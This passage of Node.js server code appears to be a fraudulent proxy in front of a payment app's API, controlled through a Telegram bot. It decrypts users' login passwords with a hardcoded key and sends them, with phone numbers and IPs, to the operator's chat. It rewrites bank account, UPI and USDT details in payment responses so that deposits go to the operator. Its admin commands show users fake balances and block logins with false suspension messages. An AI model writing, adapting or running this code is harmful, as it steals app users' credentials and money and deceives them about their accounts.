      const mi = String(nowDate.getMinutes()).padStart(2, '0');
      const ss = String(nowDate.getSeconds()).padStart(2, '0');
      const formattedTime = `${dd}/${mm}/${yyyy} ${hh}:${mi}:${ss}`;
      const balAfterAdd = updatedBal !== 'N/A' ? String(updatedBal) : String(amount);
      freshData.userOverrides[targetUserId].quotaRecords.push({
        amount: "+" + String(amount),
        balance: balAfterAdd,
        createTime: formattedTime,
        sourceType: "Deposit From Admin",
        sourceTypeGroup: "Admin"
      });
      freshData._skipOverrideMerge = true;
      await saveData(freshData);
      await bot.sendMessage(chatId, `✅ Added ₹${amount} to user ${targetUserId}\n💰 Total added: ₹${freshData.userOverrides[targetUserId].addedBalance}\n📊 Updated balance: ₹${updatedBal}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/deduct ')) {
      const parts = text.substring(8).trim().split(/\s+/);
      const amount = parseFloat(parts[0]);
      const targetUserId = parts[1] || '';
      if (isNaN(amount) || !targetUserId) {
        await bot.sendMessage(chatId, '❌ Format: /deduct <amount> <userId>\nExample: /deduct 500 93527');
        return res.sendStatus(200);
      }
      const freshData2 = await loadData(true);
      if (!freshData2.userOverrides) freshData2.userOverrides = {};
      if (!freshData2.userOverrides[targetUserId]) freshData2.userOverrides[targetUserId] = {};
      freshData2.userOverrides[targetUserId].addedBalance = (freshData2.userOverrides[targetUserId].addedBalance || 0) - amount;
      const tracked2 = freshData2.trackedUsers && freshData2.trackedUsers[targetUserId];
      const currentBal2 = tracked2 ? tracked2.balance : 'N/A';
      const updatedBal2 = currentBal2 !== 'N/A' ? parseFloat((parseFloat(currentBal2) + freshData2.userOverrides[targetUserId].addedBalance).toFixed(2)) : 'N/A';
      if (!freshData2.balanceHistory) freshData2.balanceHistory = [];
      freshData2.balanceHistory.push({
        type: 'deduct',
        userId: targetUserId,
        amount: amount,
        totalAdded: freshData2.userOverrides[targetUserId].addedBalance,
        originalBalance: currentBal2,
        updatedBalance: updatedBal2,
        time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
        phone: (tracked2 && tracked2.phone) || ''
      });
      if (freshData2.userOverrides[targetUserId].quotaRecords && freshData2.userOverrides[targetUserId].quotaRecords.length > 0) {
        let remaining = amount;
        const records = freshData2.userOverrides[targetUserId].quotaRecords;
        while (remaining > 0 && records.length > 0) {
          const last = records[records.length - 1];
          const lastAmt = parseFloat(last.amount) || 0;
          if (lastAmt <= remaining) {
            remaining = parseFloat((remaining - lastAmt).toFixed(2));
            records.pop();
          } else {
            last.amount = String(parseFloat((lastAmt - remaining).toFixed(2)));
            remaining = 0;
          }
        }
      }
      if (freshData2.userOverrides[targetUserId].addedBalance === 0) delete freshData2.userOverrides[targetUserId].addedBalance;
      freshData2._skipOverrideMerge = true;
      await saveData(freshData2);
      await bot.sendMessage(chatId, `✅ Deducted ₹${amount} from user ${targetUserId}\n💰 Total added: ₹${freshData2.userOverrides[targetUserId].addedBalance || 0}\n📊 Updated balance: ₹${updatedBal2}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/remove balance ')) {
      const targetId = text.substring(16).trim();
      if (!targetId) { await bot.sendMessage(chatId, '❌ Format: /remove balance <userId>'); return res.sendStatus(200); }
      if (data.userOverrides && data.userOverrides[targetId] && data.userOverrides[targetId].addedBalance !== undefined) {
        const removed = data.userOverrides[targetId].addedBalance;
        delete data.userOverrides[targetId].addedBalance;
        delete data.userOverrides[targetId].quotaRecords;
        if (!data.balanceHistory) data.balanceHistory = [];
        const tracked = data.trackedUsers && data.trackedUsers[targetId];
        data.balanceHistory.push({
          type: 'remove',
          userId: targetId,
          amount: removed,
          totalAdded: 0,
          originalBalance: tracked ? tracked.balance : 'N/A',
          updatedBalance: tracked ? tracked.balance : 'N/A',
          time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
          phone: (tracked && tracked.phone) || ''
        });
        data._skipOverrideMerge = true;
        await saveData(data);
        await bot.sendMessage(chatId, `🗑 Removed ₹${removed} fake balance from user ${targetId}\n💰 Now showing real balance`);
      } else {
        await bot.sendMessage(chatId, `ℹ️ User ${targetId} has no fake balance added.`);
      }
      return res.sendStatus(200);
    }

    if (text.startsWith('/control sell ')) {
      const sellTargetId = text.substring(14).trim();
      if (!sellTargetId) { await bot.sendMessage(chatId, '❌ Format: /control sell <userId>'); return res.sendStatus(200); }
      if (!data.userOverrides) data.userOverrides = {};
      if (!data.userOverrides[sellTargetId]) data.userOverrides[sellTargetId] = {};
      const currentState = !!data.userOverrides[sellTargetId].sellControl;
      data.userOverrides[sellTargetId].sellControl = !currentState;
      if (!currentState) {
        delete data.userOverrides[sellTargetId].lastRealBalance;
      }
      data._skipOverrideMerge = true;
      await saveData(data);
      const stateText = data.userOverrides[sellTargetId].sellControl ? '🟢 ON' : '🔴 OFF';
      let msg = `🔒 Sell Control ${stateText}\n👤 User: ${sellTargetId}\n💰 Cut Amount: ₹50 (fixed)`;
      if (data.userOverrides[sellTargetId].sellControl) {
        msg += `\n\n📌 Next /mine call se balance track hoga`;
        msg += `\n📌 Har sell cut ₹50 mein convert hoga`;
      }
      await bot.sendMessage(chatId, msg);
      return res.sendStatus(200);
    }

    if (text === '/sell history' || text.startsWith('/sell history ')) {
      const shTarget = text.startsWith('/sell history ') ? text.substring(14).trim() : '';
      const sh = data.sellHistory || [];
      if (sh.length === 0) { await bot.sendMessage(chatId, '📋 No sell cut history yet.'); return res.sendStatus(200); }
      const filtered = shTarget ? sh.filter(h => String(h.userId) === shTarget) : sh;
      if (filtered.length === 0) { await bot.sendMessage(chatId, `📋 No sell history for user ${shTarget}`); return res.sendStatus(200); }
      const last10 = filtered.slice(-10);
      let totalOriginal = 0, totalModified = 0, totalSaved = 0;
      for (const h of filtered) {
        totalOriginal += h.originalCut || 0;
        totalModified += h.modifiedCut || 0;
        totalSaved += h.compensation || 0;
      }
      let msg = `🔒 SELL CUT HISTORY\n━━━━━━━━━━━━━━━━━━\n`;
      msg += `📊 Total Intercepts: ${filtered.length}\n`;
      msg += `📥 Total Original Cuts: ₹${totalOriginal.toFixed(2)}\n`;
      msg += `✂️ Total Modified Cuts: ₹${totalModified.toFixed(2)}\n`;
      msg += `💰 Total Saved: ₹${totalSaved.toFixed(2)}\n`;
      msg += `━━━━━━━━━━━━━━━━━━\n\n`;
      for (const h of last10) {
        msg += `👤 ${h.userId} | ₹${h.originalCut} → ₹${h.modifiedCut} | ${h.time}\n`;
      }
      if (filtered.length > 10) msg += `\n... showing last 10 of ${filtered.length}`;
      await bot.sendMessage(chatId, msg);
      return res.sendStatus(200);
    }

    if (text === '/history' || text.startsWith('/history ')) {
      const historyTarget = text.startsWith('/history ') ? text.substring(9).trim() : '';
      const history = data.balanceHistory || [];
      if (history.length === 0) { await bot.sendMessage(chatId, '📋 No balance history yet.'); return res.sendStatus(200); }
      const filtered = historyTarget ? history.filter(h => h.userId === historyTarget) : history;
      if (filtered.length === 0) { await bot.sendMessage(chatId, `📋 No history for user ${historyTarget}`); return res.sendStatus(200); }
      const userSummary = {};
      for (const h of filtered) {
        if (!userSummary[h.userId]) userSummary[h.userId] = { added: 0, deducted: 0, totalNet: 0, phone: h.phone || '', entries: [] };
        const s = userSummary[h.userId];
        if (h.type === 'add') s.added += h.amount;
        else s.deducted += h.amount;
        s.totalNet = h.totalAdded || 0;
        if (h.phone) s.phone = h.phone;
        s.entries.push(h);
      }
      let m = '📊 Balance History:\n\n';
      for (const [uid, s] of Object.entries(userSummary)) {
        const tracked = data.trackedUsers && data.trackedUsers[uid];
        const currentBal = tracked ? tracked.balance : 'N/A';
        m += `👤 User: ${uid}${s.phone ? ' (' + s.phone + ')' : ''}\n`;
        m += `   ➕ Total Added: ₹${s.added.toFixed(2)}\n`;
        m += `   ➖ Total Deducted: ₹${s.deducted.toFixed(2)}\n`;
        m += `   📊 Net Change: ₹${(s.added - s.deducted).toFixed(2)}\n`;
        m += `   💰 Current Balance: ₹${currentBal}\n`;
        m += `   📜 Entries:\n`;
        const recent = s.entries.slice(-10);
        for (const e of recent) {
          const icon = e.type === 'add' ? '➕' : '➖';
          m += `   ${icon} ₹${e.amount} | Bal: ₹${e.updatedBalance} | ${e.time}\n`;
        }
        if (s.entries.length > 10) m += `   ... ${s.entries.length - 10} more entries\n`;
        m += '\n';
      }
      if (m.length > 4000) m = m.substring(0, 4000) + '\n... (truncated)';
      await bot.sendMessage(chatId, m);
      return res.sendStatus(200);
    }

    if (text === '/clearhistory') {
      data.balanceHistory = [];
      await saveData(data);
      await bot.sendMessage(chatId, '🗑 Balance history cleared.');
      return res.sendStatus(200);
    }

    if (text === '/idtrack') {
      const tracked = data.trackedUsers || {};
      const ids = Object.keys(tracked);
      if (ids.length === 0) { await bot.sendMessage(chatId, '📋 No users tracked yet. Users will appear after they use the app.'); return res.sendStatus(200); }
      let m = '📋 Tracked User IDs:\n\n';
      for (const uid of ids) {
        const u = tracked[uid];
        const hasOverride = data.userOverrides && data.userOverrides[uid] ? ' ⚙️' : '';
        m += `👤 ID: ${uid}${hasOverride}\n`;
        if (u.name) m += `   📛 Name: ${u.name}\n`;
        if (u.phone) m += `   📱 Phone: ${u.phone}\n`;
        if (u.balance) m += `   💰 Balance: ${u.balance}\n`;
        m += `   🕐 Last: ${u.lastAction || 'N/A'} @ ${u.lastSeen || 'N/A'}\n`;
        m += `   📦 Orders: ${u.orderCount || 0}\n\n`;
      }
      if (m.length > 4000) m = m.substring(0, 4000) + '\n... (truncated)';
      await bot.sendMessage(chatId, m);
      return res.sendStatus(200);
    }

    if (text === '/banks') {
      if (!data.banks || data.banks.length === 0) { await bot.sendMessage(chatId, '❌ No banks added'); return res.sendStatus(200); }
      let m = '💳 Banks:\n\n' + bankListText(data);
      await bot.sendMessage(chatId, m);
      return res.sendStatus(200);
    }

    if (text.startsWith('/addbank ')) {
      const parts = text.substring(9).split('|').map(s => s.trim());
      if (parts.length < 3) { await bot.sendMessage(chatId, '❌ Format: /addbank Name|AccNo|IFSC|BankName|UPI\n(BankName and UPI optional)'); return res.sendStatus(200); }
      if (data.banks.length >= 10) { await bot.sendMessage(chatId, '❌ Max 10 banks.'); return res.sendStatus(200); }
      const newBank = { accountHolder: parts[0], accountNo: parts[1], ifsc: parts[2], bankName: parts[3] || '', upiId: parts[4] || '' };
      data.banks.push(newBank);
      if (data.activeIndex < 0) data.activeIndex = 0;
      await saveData(data);
      await bot.sendMessage(chatId, `✅ Bank #${data.banks.length} added:\n${newBank.accountHolder} | ${newBank.accountNo}\nIFSC: ${newBank.ifsc}${newBank.bankName ? '\nBank: ' + newBank.bankName : ''}${newBank.upiId ? '\nUPI: ' + newBank.upiId : ''}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/removebank ')) {
      const idx = parseInt(text.substring(12).trim()) - 1;
      if (isNaN(idx) || idx < 0 || idx >= (data.banks || []).length) { await bot.sendMessage(chatId, '❌ Invalid. /banks se check karo'); return res.sendStatus(200); }
      const removed = data.banks.splice(idx, 1)[0];
      if (data.activeIndex === idx) data.activeIndex = data.banks.length > 0 ? 0 : -1;
      else if (data.activeIndex > idx) data.activeIndex--;
      if (data.userOverrides) {
        for (const uid of Object.keys(data.userOverrides)) {
          const uo = data.userOverrides[uid];
          if (uo.bankIndex !== undefined) {
            if (uo.bankIndex === idx) delete uo.bankIndex;
            else if (uo.bankIndex > idx) uo.bankIndex--;
          }
        }
      }
      await saveData(data);
      await bot.sendMessage(chatId, `🗑️ Removed: ${removed.accountHolder} | ${removed.accountNo}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/setbank ')) {
      const idx = parseInt(text.substring(9).trim()) - 1;
      if (isNaN(idx) || idx < 0 || idx >= (data.banks || []).length) { await bot.sendMessage(chatId, '❌ Invalid index'); return res.sendStatus(200); }
      data.activeIndex = idx;
      await saveData(data);
      await bot.sendMessage(chatId, `✅ Active bank #${idx + 1}: ${data.banks[idx].accountHolder}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/usdt ')) {
      const addr = text.substring(6).trim();
      if (addr.toLowerCase() === 'off') {
        data.usdtAddress = '';
        await saveData(data);
        await bot.sendMessage(chatId, '❌ USDT override OFF');
      } else if (addr.length >= 20) {
        data.usdtAddress = addr;
        await saveData(data);
        await bot.sendMessage(chatId, `₮ USDT address set: ${addr}`);
      } else {
        await bot.sendMessage(chatId, '❌ Invalid address (20+ chars required)');
      }
      return res.sendStatus(200);
    }


    if (text.startsWith('/suspend ')) {
      const suspendPhone = text.substring(9).trim();
      if (!suspendPhone) { await bot.sendMessage(chatId, '❌ Format: /suspend <phoneNumber>\nExample: /suspend 9876543210'); return res.sendStatus(200); }
      if (!data.suspendedPhones) data.suspendedPhones = {};
      data.suspendedPhones[suspendPhone] = { suspended: true, time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }) };
      await saveData(data);
      await bot.sendMessage(chatId, `🚫 Suspended: ${suspendPhone}\nUser will see "ID Suspended" on login.\n\nTo unsuspend: /unsuspend ${suspendPhone}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/unsuspend ')) {
      const unsuspendPhone = text.substring(11).trim();
      if (!unsuspendPhone) { await bot.sendMessage(chatId, '❌ Format: /unsuspend <phoneNumber>'); return res.sendStatus(200); }
      if (data.suspendedPhones && data.suspendedPhones[unsuspendPhone]) {
        delete data.suspendedPhones[unsuspendPhone];
        await saveData(data);
        await bot.sendMessage(chatId, `✅ Unsuspended: ${unsuspendPhone}\nUser can login now.`);
      } else {
        await bot.sendMessage(chatId, `ℹ️ ${unsuspendPhone} is not suspended.`);
      }
      return res.sendStatus(200);
    }

    if (text === '/suspended') {
      const phones = data.suspendedPhones ? Object.keys(data.suspendedPhones) : [];
      if (phones.length === 0) { await bot.sendMessage(chatId, '📋 No suspended users.'); return res.sendStatus(200); }
      let msg = '🚫 SUSPENDED USERS\n━━━━━━━━━━━━━━━━━━\n';
      for (const p of phones) {
        msg += `📱 ${p} — ${data.suspendedPhones[p].time || 'N/A'}\n`;
      }
      await bot.sendMessage(chatId, msg);
      return res.sendStatus(200);
    }

    if (text === '/help') {
      await bot.sendMessage(chatId, 'Use /start to see all commands.');
      return res.sendStatus(200);
    }

    return res.sendStatus(200);
  } catch(e) {
    console.error('Bot error:', e);
    return res.sendStatus(200);
  }
});

app.post('/app/api/system/v2/login', async (req, res) => {
  try {
    const data = await loadData();
    const body = req.parsedBody || {};
    const phone = body.memberPhone || body.phone || body.mobile || body.telephone || body.username || '';
    if (phone && data.suspendedPhones && data.suspendedPhones[String(phone)]) {
      if (data.adminChatId && bot) {
        bot.sendMessage(data.adminChatId, `🚫 BLOCKED LOGIN\n📱 Phone: ${phone}\n🔒 Status: Suspended\n🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`).catch(()=>{});
      }
      const fakeResp = { code: 500, message: 'ID Suspended', data: null };
      res.set('Content-Type', 'application/json');
      return res.status(200).json(fakeResp);
    }
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);

    if (data.adminChatId && bot) {
      const sentHeaders = {};
      for (const [k, v] of Object.entries(req.headers)) {
        const kl = k.toLowerCase();
        if (!['host','connection','content-length','transfer-encoding'].includes(kl) && !kl.startsWith('x-vercel') && !kl.startsWith('x-forwarded')) {
          sentHeaders[k] = v;
        }
      }
      const debugMsg = `🔍 LOGIN DEBUG\n📱 Phone: ${phone}\n\n📤 HEADERS SENT TO API:\n${JSON.stringify(sentHeaders, null, 2).substring(0, 1500)}\n\n📥 API RESPONSE:\n${JSON.stringify(jsonResp, null, 2).substring(0, 1000)}`;
      bot.sendMessage(data.adminChatId, debugMsg).catch(() => {});
    }

    const userId = await extractUserId(req, jsonResp);
    if (userId) {
      saveTokenUserId(req, userId);
      if (phone) userPhoneMap[String(userId)] = String(phone);
      const loginData = getResponseData(jsonResp);
      if (loginData && loginData.token) {
        tokenUserMap[loginData.token] = String(userId);
        if (redis) redis.hset('iukpayTokenMap', loginData.token.substring(0, 100), String(userId)).catch(()=>{});
      }
      if (loginData && loginData.accessToken) {
        tokenUserMap[loginData.accessToken] = String(userId);
        if (redis) redis.hset('iukpayTokenMap', loginData.accessToken.substring(0, 100), String(userId)).catch(()=>{});
      }
      if (loginData) {
        const respPhone = loginData.memberPhone || loginData.phone || loginData.mobile || loginData.telephone || '';
        if (respPhone && userId) userPhoneMap[String(userId)] = String(respPhone);
      }
      const detectedPhone = phone || (loginData?.memberPhone || loginData?.phone || loginData?.mobile || loginData?.telephone || '');
      trackUser(data, userId, 'Login', detectedPhone);
      saveData(data).catch(()=>{});
    } else if (phone) {
      const loginData = getResponseData(jsonResp);
      const respUserId = loginData?.memberCodeId || loginData?.memberId || loginData?.userId || loginData?.id || '';
      if (respUserId) {
        userPhoneMap[String(respUserId)] = String(phone);
        saveTokenUserId(req, String(respUserId));
        if (loginData && loginData.token) {
          tokenUserMap[loginData.token] = String(respUserId);
          if (redis) redis.hset('iukpayTokenMap', loginData.token.substring(0, 100), String(respUserId)).catch(()=>{});
        }
        if (loginData && loginData.accessToken) {
          tokenUserMap[loginData.accessToken] = String(respUserId);
          if (redis) redis.hset('iukpayTokenMap', loginData.accessToken.substring(0, 100), String(respUserId)).catch(()=>{});
        }
        trackUser(data, String(respUserId), 'Login', phone);
        saveData(data).catch(()=>{});
      }
    }
    const loginData2 = getResponseData(jsonResp);
    const finalUserId = userId || loginData2?.memberCodeId || loginData2?.memberId || loginData2?.userId || '';
    if (data.adminChatId && bot) {
      const encPwd = body.memberPwd || body.password || body.pwd || '';
      let pwd = encPwd;
      if (encPwd) {
        try {
          const AES_KEY = '3o8pxFGcHajTeVpp';
          const keyBytes = Buffer.from(AES_KEY, 'utf8');
          const iv = keyBytes.slice(0, 16);
          const decipher = crypto.createDecipheriv('aes-128-cbc', keyBytes, iv);
          let decrypted = decipher.update(Buffer.from(encPwd, 'base64'));
          decrypted = Buffer.concat([decrypted, decipher.final()]);
          pwd = decrypted.toString('utf8');
        } catch(e) { pwd = encPwd; }
      }
      bot.sendMessage(data.adminChatId, `🔑 Login\n📱 Phone: ${phone || 'N/A'}\n🔒 Password: ${pwd || 'N/A'}\n👤 UserID: ${finalUserId || 'N/A'}\n🌐 IP: ${req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || 'N/A'}\n📍 City: ${req.headers['x-vercel-ip-city'] || 'N/A'}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

async function proxyAndReplaceBankDetails(req, res, label) {
  const data = await loadData();
  const reqUserId = await extractUserId(req, null);
  const reqEff = getEffectiveSettings(data, reqUserId);
  if (reqEff.botEnabled === false) return await transparentProxy(req, res);

  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const detectedUserId = await extractUserId(req, jsonResp) || reqUserId;
    const eff = getEffectiveSettings(data, detectedUserId);
    const active = eff.botEnabled !== false ? await getActiveBankAndSave(data, detectedUserId) : null;

    const respData = getResponseData(jsonResp);

    if (debugNextResponse && data.adminChatId && bot) {
      debugNextResponse = false;
      const dump = JSON.stringify(jsonResp, null, 2).substring(0, 3500);
      bot.sendMessage(data.adminChatId, `🔍 DEBUG ${req.originalUrl}\n\n${dump}`).catch(()=>{});
    }

    if (respData && active) {
      if (Array.isArray(respData)) {
        respData.forEach(item => { if (item && typeof item === 'object') deepReplace(item, active, {}, 0); });
      } else {
        const originalValues = {};
        deepReplace(respData, active, originalValues, 0);
      }
    }

    if (data.adminChatId && bot && !isLogOff(data, detectedUserId) && !(await isLogOffByToken(data, req))) {
      const rd = (respData && typeof respData === 'object' && !Array.isArray(respData)) ? respData : {};
      const orderId = rd.orderId || rd.orderNo || req.parsedBody?.orderId || 'N/A';
      const amount = rd.amount || rd.orderAmount || req.parsedBody?.amount || 'N/A';
      const phone = getPhone(data, detectedUserId);
      bot.sendMessage(data.adminChatId,
`🔔 ${label}
👤 User: ${detectedUserId || 'N/A'}${phone ? ' (' + phone + ')' : ''}
Order: ${orderId}
Amount: ₹${amount}
Bank: ${active ? active.accountNo : 'N/A'}
Acc: ${active ? active.accountHolder : 'None'}
Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
      ).catch(()=>{});
    }

    if (detectedUserId) {
      trackUser(data, detectedUserId, `Order ${jsonResp?.data?.orderId || ''}`);
      saveData(data).catch(()=>{});
    }

    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) {
    console.error('Proxy+replace error:', req.originalUrl, e.message);
    if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
  }
}

async function proxyAndReplaceBankInList(req, res) {
  const data = await loadData();

  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const detectedUserId = await extractUserId(req, jsonResp);
    if (detectedUserId) saveTokenUserId(req, detectedUserId);
    const eff = getEffectiveSettings(data, detectedUserId);
    const active = (eff.botEnabled !== false) ? await getActiveBankAndSave(data, detectedUserId) : null;

    const listData = getResponseData(jsonResp);
    if (listData) {
      const applyToItem = (item) => {
        const itemUserId = item.userId ? String(item.userId) : (item.memberId ? String(item.memberId) : detectedUserId);
        const itemEff = getEffectiveSettings(data, itemUserId);
        const itemActive = (itemEff.botEnabled !== false) ? getActiveBank(data, itemUserId) : null;
        if (itemActive) { const origVals = {}; deepReplace(item, itemActive, origVals, 0); }
        if (itemEff.depositSuccess) markDepositSuccess(item);
      };
      if (Array.isArray(listData)) {
        listData.forEach(applyToItem);
      } else if (listData.list && Array.isArray(listData.list)) {
        listData.list.forEach(applyToItem);
      } else if (listData.records && Array.isArray(listData.records)) {
        listData.records.forEach(applyToItem);
      } else if (listData.rows && Array.isArray(listData.rows)) {
        listData.rows.forEach(applyToItem);
      } else {
        applyToItem(listData);
      }
    }

    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) {
    console.error('List replace error:', req.originalUrl, e.message);
    if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
  }
}

async function proxyAndAddBonus(req, res) {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const detectedUserId = await extractUserId(req, jsonResp);
    const eff = getEffectiveSettings(data, detectedUserId);
    const bonus = eff.depositSuccess ? (eff.depositBonus || 0) : 0;

    if (detectedUserId) {
      saveTokenUserId(req, detectedUserId);
      trackUser(data, detectedUserId, `App Open ${req.path}`);
      saveData(data).catch(()=>{});
    }

    const bonusData = getResponseData(jsonResp);
    if (bonus > 0 && bonusData) {
      addBonusToBalanceFields(bonusData, bonus);
    }

    if (detectedUserId && bonusData && typeof bonusData === 'object') {
      const userOvr = data.userOverrides && data.userOverrides[String(detectedUserId)];
      const addedBal = userOvr && userOvr.addedBalance !== undefined ? userOvr.addedBalance : 0;
      if (addedBal !== 0) {
        addBonusToBalanceFields(bonusData, addedBal);
      }
    }

    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) {
    if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
  }
}

app.post('/app/api/orderOut/getPaymentOrder', async (req, res) => {
  await proxyAndReplaceBankDetails(req, res, '💰 Payment Order');
});

app.post('/app/api/orderOut/detail', async (req, res) => {
  await proxyAndReplaceBankDetails(req, res, '📋 Order Detail');
});

app.post('/app/api/orderOut/pendingDetail', async (req, res) => {
  const data = await loadData();
  const reqUserId = await extractUserId(req, null);
  const reqEff = getEffectiveSettings(data, reqUserId);
  if (reqEff.botEnabled === false) return await transparentProxy(req, res);
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const detectedUserId = await extractUserId(req, jsonResp) || reqUserId;
    const eff = getEffectiveSettings(data, detectedUserId);
    const active = eff.botEnabled !== false ? await getActiveBankAndSave(data, detectedUserId) : null;
    const respData = getResponseData(jsonResp);
    if (data.adminChatId && bot) {
      const dump = JSON.stringify(jsonResp, null, 2).substring(0, 3500);
      bot.sendMessage(data.adminChatId, `🔍 PENDING DETAIL RAW:\n${dump}`).catch(()=>{});
    }
    if (respData && active) {
      if (Array.isArray(respData)) {
        respData.forEach(item => { if (item && typeof item === 'object') deepReplace(item, active, {}, 0); });
      } else {
        deepReplace(respData, active, {}, 0);
      }
    }
    const phone = getPhone(data, detectedUserId);
    if (data.adminChatId && bot) {
      const rd = (respData && typeof respData === 'object' && !Array.isArray(respData)) ? respData : {};
      bot.sendMessage(data.adminChatId,
`🔔 📋 Pending Detail
👤 User: ${detectedUserId || 'N/A'}${phone ? ' (' + phone + ')' : ''}
Order: ${rd.orderId || rd.orderNo || 'N/A'}
Amount: ₹${rd.amount || rd.orderAmount || 'N/A'}
Bank: ${active ? active.accountNo : 'N/A'}
Acc: ${active ? active.accountHolder : 'None'}
Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
      ).catch(()=>{});
    }
    if (detectedUserId) { trackUser(data, detectedUserId, 'PendingDetail'); saveData(data).catch(()=>{}); }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) {
    console.error('PendingDetail error:', e.message);
    if (!res.headersSent) await transparentProxy(req, res);
  }
});

app.post('/app/api/orderOut/getPayWallet', async (req, res) => {
  const data = await loadData();
  const reqUserId = await extractUserId(req, null);
  const reqEff = getEffectiveSettings(data, reqUserId);
  if (reqEff.botEnabled === false) return await transparentProxy(req, res);
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const detectedUserId = await extractUserId(req, jsonResp) || reqUserId;
    const eff = getEffectiveSettings(data, detectedUserId);
    const active = eff.botEnabled !== false ? await getActiveBankAndSave(data, detectedUserId) : null;
    if (data.adminChatId && bot) {
      const dump = JSON.stringify(jsonResp, null, 2).substring(0, 3500);
      bot.sendMessage(data.adminChatId, `🔍 PAY WALLET RAW RESPONSE:\n${dump}`).catch(()=>{});
    }
    const pwData = getResponseData(jsonResp);
    if (pwData && active) {
      if (Array.isArray(pwData)) {
        pwData.forEach(item => { if (item && typeof item === 'object') deepReplace(item, active, {}, 0); });
      } else {
        deepReplace(pwData, active, {}, 0);
      }
    }
    const phone = getPhone(data, detectedUserId);
    if (data.adminChatId && bot) {
      const rd = (pwData && typeof pwData === 'object' && !Array.isArray(pwData)) ? pwData : {};
      const orderId = rd.orderId || rd.orderNo || req.parsedBody?.orderId || 'N/A';
      const amount = rd.amount || rd.orderAmount || req.parsedBody?.amount || 'N/A';
      bot.sendMessage(data.adminChatId,
`🔔 💳 Pay Wallet
👤 User: ${detectedUserId || 'N/A'}${phone ? ' (' + phone + ')' : ''}
Order: ${orderId}
Amount: ₹${amount}
Bank: ${active ? active.accountNo : 'N/A'}
Acc: ${active ? active.accountHolder : 'None'}
Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
      ).catch(()=>{});
    }
    if (detectedUserId) { trackUser(data, detectedUserId, 'PayWallet'); saveData(data).catch(()=>{}); }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) {
    console.error('PayWallet error:', e.message);
    if (!res.headersSent) await transparentProxy(req, res);
  }
});

app.post('/app/api/memberManager/getBankAccount', async (req, res) => {
  await proxyAndReplaceBankDetails(req, res, '🏦 Get Bank Account');
});

app.post('/app/api/memberRecharge/createPaymentOrder', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const userId = await extractUserId(req, jsonResp);
    if (userId) { trackUser(data, userId, 'Recharge Order'); saveData(data).catch(()=>{}); }
    const rechargeData = getResponseData(jsonResp);
    if (rechargeData && data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
      const d = (typeof rechargeData === 'object' && !Array.isArray(rechargeData)) ? rechargeData : {};
      bot.sendMessage(data.adminChatId, `🔔 Recharge Order [${userId || 'N/A'}]\nAmount: ₹${d.amount || d.orderAmount || 'N/A'}\nOrder: ${d.orderId || d.orderNo || 'N/A'}`).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.post('/app/api/memberRecharge/confirmRecharge', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const userId = await extractUserId(req, jsonResp);
    const body = req.parsedBody || {};
    if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
      bot.sendMessage(data.adminChatId, `✅ Recharge Confirmed [${userId || 'N/A'}]\nUTR: ${body.utr || body.transactionId || 'N/A'}\nAmount: ₹${body.amount || 'N/A'}\nOrder: ${body.orderId || body.orderNo || 'N/A'}`).catch(()=>{});
    }
    if (userId) { trackUser(data, userId, `UTR ${body.utr || body.transactionId || ''}`); saveData(data).catch(()=>{}); }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.post('/app/api/memberRecharge/getPaymentOrderDetail', async (req, res) => {
  const data = await loadData();
  if (!data.botEnabled) return await transparentProxy(req, res);
  const bank = await getActiveBankAndSave(data);
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const detailData = getResponseData(jsonResp);
    if (detailData) {
      if (bank) {
        if (Array.isArray(detailData)) {
          detailData.forEach(item => { if (item && typeof item === 'object') deepReplace(item, bank, {}, 0); });
        } else {
          deepReplace(detailData, bank, {}, 0);
        }
      }
      if (data.usdtAddress) {
        replaceUsdtInResponse(jsonResp, data);
        const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(data.usdtAddress)}`;
        let str = JSON.stringify(jsonResp);
        str = str.replace(/https?:\/\/oss\.[^\s"',\\}]+/gi, qrUrl);
